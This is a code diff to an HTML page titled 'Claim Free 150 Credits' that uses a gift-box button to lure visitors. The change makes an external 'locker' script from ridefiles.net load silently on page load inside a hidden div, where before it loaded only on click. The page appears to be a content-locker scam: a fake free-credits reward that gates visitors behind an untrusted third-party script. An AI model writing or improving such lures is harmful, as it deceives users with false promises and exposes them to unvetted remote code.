@@ -39,6 +39,10 @@
     .gift-box:hover {
       transform: scale(1.1);
     }
+    #locker-wrapper {
+      display: none;
+      margin-top: 40px;
+    }
   </style>
 </head>
 <body>
@@ -51,16 +55,15 @@
     <h2>Claim Free 150 Credits</h2>
     <p>Click the gift box below to unlock your reward!</p>
     <div class="gift-box" onclick="unlockContent()">🎁</div>
+
+    <div id="locker-wrapper">
+      <script type="text/javascript" src="https://ridefiles.net/script_include.php?id=1818923"></script>
+    </div>
   </div>
 
   <script>
     function unlockContent() {
-      if (window.lockerLoaded) return; // prevent double loading
-      window.lockerLoaded = true;
-
-      const s = document.createElement("script");
-      s.src = "https://ridefiles.net/script_include.php?id=1818923";
-      document.body.appendChild(s);
+      document.getElementById("locker-wrapper").style.display = "block";
     }
   </script>
 
